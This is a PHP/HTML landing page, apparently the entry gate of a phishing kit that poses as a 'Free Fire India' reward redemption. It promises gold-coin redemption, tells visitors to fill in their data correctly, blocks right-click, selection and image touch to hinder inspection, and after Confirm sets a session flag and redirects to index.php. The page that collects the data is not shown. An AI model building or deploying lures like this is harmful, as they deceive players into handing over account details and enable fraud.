<?php
session_start();
// 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 𝗚𝗮𝗹𝗮𝘅𝘆𝗖𝗼𝗱𝗲𝗿(𝗦)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['confirm'])) {
    $_SESSION['access_granted'] = true;
    header('Location: index.php');
    exit();
}
?>

<!DOCTYPE html>
<!-- info.php -->
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Fire India</title>
    <style>
    * {
        user-select: none;
        -webkit-user-select: none;
        -ms-user-select: none;
        -moz-user-select: none;
        -webkit-touch-callout: none;
    }

    body {
        background-color: #000;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        overflow: hidden;
        font-family: Arial, sans-serif;
    }

    .container {
        background-color: #111;
        border-radius: 1px;
        width: 350px;
        height: 210px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
        border: 1px solid #333;
        overflow: hidden;
    }

    .header-img {
        width: 100%;
        height: 15%;
        display: block;
        border-bottom: 1px solid transparent;
        pointer-events: none;
    }

    .content {
        background-color: #111;
        color: #e6e6e6;
        padding: 20px 15px;
        text-align: center;
        font-size: 14px;
        line-height: 1.5;
        border-bottom: 1px solid #444;
    }

    .good-luck {
        margin-top: 20px;
        font-weight: bold;
    }

    .button-container {
        padding: 15px;
        text-align: center;
        background: #222;
    }

    .confirm-btn {
        background-color: #ffaa00;
        border: none;
        padding: 10px 20px;
        width: 120px;
        color: #111;
        font-size: 14px;
        top: 10px;
        cursor: pointer;
        font-weight: bold;
        border-radius: 1px;
        letter-spacing: 0.5px;
    }

    .confirm-btn:hover {
        background-color: #e69900;
    }
    </style>
</head>
<body>
    <div class="container">
        <!-- Updated header with image -->
        <img src="https://i.ibb.co/FbshJHM/IMG-20240905-224204.jpg" alt="Free Fire India" class="header-img" oncontextmenu="return false;">
        
        <div class="content">
            <p>1. Automatically Reduce Your Gold Coins
<br>
2. Make Sure You Fill In The Data Correctly
<br>
3. Redeem Only Valid for One ID Character.</p>
            <p class="good-luck">Good luck and have fun!</p>
            
            <form method="POST">
                <button class="confirm-btn" name="confirm">Confirm</button>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('contextmenu', function(event) {
            event.preventDefault();
        });

        document.querySelectorAll('img').forEach(function(img) {
            img.addEventListener('touchstart', function(e) {
                e.preventDefault();
            });
        });

        function redirectToIndex() {
            window.location.href = "index.php";
        }
    </script>
</body>
</html>
